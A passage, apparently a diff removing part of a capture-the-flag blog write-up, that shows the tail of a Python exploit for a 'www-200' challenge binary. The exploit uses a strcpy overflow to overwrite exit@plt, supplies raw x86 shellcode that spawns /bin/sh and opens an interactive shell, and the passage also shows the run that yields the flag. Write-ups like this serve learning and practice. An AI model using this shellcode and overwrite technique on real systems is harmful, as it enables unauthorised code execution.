-buf2_addr = int(m[1], 16)
-
-print "[~] buf1: 0x%lx" % buf1_addr
-print "[~] buf2: 0x%lx" % buf2_addr
-
-# first input will overwrite the pointer that is used for the second strcpy 
-payload = ""
-payload += "A"*45       # padding
-payload += p(0x8049d10) # we'll overwrite exit@plt
-payload += p(buf2_addr) # restore this on the stack, otherwise it will be partially overwritten
-
-s.send(payload + "\n")
-
-# second input, used in second strcpy. By now, that strcpy will call:
-# strcpy(0x8049d10, buffer2)
-payload = ""
-payload += p(buf2_addr+4)   # overwrite exit@plt with the address where the shellcode starts
-payload += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"
-
-s.send(payload + "\n")
-s.recv(200)
-
-print "[!] enjoy your shell"
-
-t = telnetlib.Telnet()
-t.sock = s
-t.interact()
-s.close()
-</code></pre>
-
-<pre><code class="bash">bas@tritonal:~/tmp/yvrctf/www-200$ python ./www.py
-[~] buf1: 0xbfa660d4
-[~] buf2: 0xbfa65fd4
-
-[!] enjoy your shell
-id
-/bin//sh: 1: id: not found
-cat flag.txt
-flag{K33P_ST4T1C_L1K3_W00L_F4BR1C}
-</code></pre>
 ]]></content>
   </entry>
   
